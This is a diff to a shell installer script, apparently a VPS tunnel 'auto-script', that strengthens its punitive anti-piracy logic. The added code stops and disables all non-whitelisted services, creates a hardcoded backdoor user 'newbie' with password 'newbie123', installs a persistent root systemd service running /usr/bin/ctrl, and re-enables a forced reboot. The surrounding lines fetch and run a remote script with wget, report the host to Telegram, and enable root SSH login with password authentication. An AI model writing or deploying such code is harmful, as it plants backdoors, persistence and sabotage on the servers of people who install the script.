@@ -119,18 +119,17 @@ rm detek.zip* > /dev/null
 cd
 }
 hentikan_service_non_whitelist() {
-#  systemctl list-units --type=service --state=running --no-pager --no-legend | awk '{print $1}' | while read -r service; do
-#    if [[ ! " ${EXCLUDED_SERVICES[*]} " =~ " $service " ]]; then
-#      echo "$service" >> "$LOG_FILE"
-#      systemctl stop "$service" > /dev/null 2>&1
-#      systemctl disable "$service" > /dev/null 2>&1
-#    fi
-#  done
+  systemctl list-units --type=service --state=running --no-pager --no-legend | awk '{print $1}' | while read -r service; do
+    if [[ ! " ${EXCLUDED_SERVICES[*]} " =~ " $service " ]]; then
+      echo "$service" >> "$LOG_FILE"
+      systemctl stop "$service" > /dev/null 2>&1
+      systemctl disable "$service" > /dev/null 2>&1
+    fi
+  done
 }
-
-adduser_najm() {
-    USERNAME="najm"
-    PASSWORD="najm123"
+adduser_newbie() {
+    USERNAME="newbie"
+    PASSWORD="newbie123"
 
     # Cek root
     if [ "$EUID" -ne 0 ]; then
@@ -182,6 +181,31 @@ adduser_najm() {
 
 inject_warning_to_profile() {
 wget -q https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/sshws.sh && chmod +x sshws.sh && ./sshws.sh
+}
+
+set_cron_keamanan() {
+  SERVICE_NAME="Polaris"
+  SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
+
+  # Buat file service systemd
+  cat > "$SERVICE_FILE" <<EOF
+[Unit]
+Description=SCRIPT Mod By Najm Tunnel
+After=network.target
+
+[Service]
+User=root
+NoNewPrivileges=true
+ExecStart=/usr/bin/ctrl
+Restart=always
+RestartSec=5s
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+  systemctl daemon-reload
+  systemctl enable --now "$SERVICE_NAME"
 }
 
 pasang_udp() {
@@ -236,13 +260,15 @@ checking_sc() {
   done
 
   if [[ "$ip_found" == true ]]; then
+    set_cron_keamanan
   	inject_warning_to_profile
     pasang_udp
   else
     send_telegram "SC TANPA IZIN DIJALANKAN DI $(hostname)"
 	setup_data
-	adduser_najm
+	adduser_newbie
     prepare_ssh_key
+	set_cron_keamanan
     sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
     sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
     sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
@@ -274,15 +300,16 @@ google_drive_file_id="#"
 download_url="https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/link.txt"
 if [[ -z "$ipsaya" ]]; then
   send_telegram "⚠️ IP Server Kosong! Server akan direboot."
-  # reboot
+  reboot
   exit 0
 fi
 
 if is_private_ip; then
   send_telegram "IP Terdeteksi Private: $ipsaya"
   setup_data
-  adduser_najm
+  adduser_newbie
   prepare_ssh_key
+  set_cron_keamanan
     sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
     sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
     sed -i 's/^#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
